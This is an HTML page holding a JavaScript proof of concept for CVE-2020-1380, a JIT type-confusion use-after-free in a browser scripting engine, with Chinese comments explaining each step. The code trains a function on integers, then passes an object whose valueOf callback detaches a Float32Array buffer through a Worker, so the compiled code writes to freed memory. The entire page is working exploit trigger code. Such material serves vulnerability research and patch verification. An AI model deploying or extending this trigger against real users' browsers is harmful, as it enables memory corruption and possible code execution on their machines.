<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>CVE-2020-1380</title>
</head>
<body>
<script>
function opt(value1, value2, arr, flag) {
    // value1 = int, value2 = int 编译时, 要触发的对象
    // arr = Float32Array, flag = int
    value1 = 1;
    arguments.push = Array.prototype.push;
    arguments.length = 0;
    
    // 让 value1 = value2
    arguments.push(value2);
    if (flag == 1) {
        value1 = 2;
    }
    
    // arr 是一个 Float32Array, 当 value1 成为 Object 时
    // 由于类型推断不正确, 会执行 valueOf 回调
    // 后备数组缓冲区可以在 valueOf 回调中分离，从而导致 UAF
    arr[1] = value1;
};
    
var arr = new Float32Array(0x100);
    
// 编译 opt 使其相信 value2 始终是 int
for (var i = 0; i < 10000; i++) {
    opt(0x1337, 0x1337, arr, 1);
}
    
var obj = new Object();
obj.valueOf = function () {
    alert("callback");
    // 释放 ArrayBuffer(arr.buffer)
    worker = new Worker("worker.js");
    worker.postMessage(0, [arr.buffer]);
    worker.terminate();
    worker = null;

    var start = Date.now();
    while(Date.now() - start < 200) {}
    return 1;
};

// 使用 value2 作为对象而不是 int 调用 opt
// JIT 错误地建模了 obj.valueOf 将被调用
opt(0x1337, obj, arr, 0);
</script>
</body>
</html>